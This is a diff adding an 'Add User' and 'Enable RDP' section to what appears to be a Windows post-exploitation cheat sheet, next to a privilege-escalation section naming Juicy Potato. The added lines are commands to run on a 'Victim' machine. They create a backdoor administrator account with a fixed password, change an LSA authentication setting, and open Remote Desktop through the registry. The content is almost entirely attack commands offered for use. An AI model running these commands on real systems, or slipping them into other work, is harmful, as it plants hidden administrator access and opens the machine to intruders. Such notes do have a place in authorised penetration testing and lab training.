@@ -54,6 +54,26 @@ Might be able to find interesting files by looking at what was recently accessed
 
 
 
+## Add User
+
+**Victim**
+
+```
+net user backdoor pass!123 /add
+net localgroup Administrators backdoor /add
+reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v forceguest /t reg_dword /d 0 /f
+```
+
+**Enable RDP**
+
+**Victim**
+
+```
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+```
+
+
+
 ## Privilege Escalation
 
 **Juicy Potato**
